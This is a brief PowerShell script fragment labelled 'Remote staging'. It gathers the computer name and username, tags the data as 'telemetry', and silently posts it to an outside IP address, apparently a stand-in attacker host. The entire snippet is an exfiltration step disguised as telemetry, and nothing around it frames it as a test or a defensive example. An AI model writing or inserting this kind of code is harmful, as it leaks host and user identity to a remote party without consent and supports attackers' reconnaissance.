
# Remote staging
$PayloadJson = [ordered]@{ Host = $env:COMPUTERNAME; User = $env:USERNAME; Stage = "telemetry" } | ConvertTo-Json
Invoke-RestMethod -Uri "http://198.51.100.236/upload" -Method Post -Body $PayloadJson -ContentType "application/json"
$ProgressPreference = "SilentlyContinue"
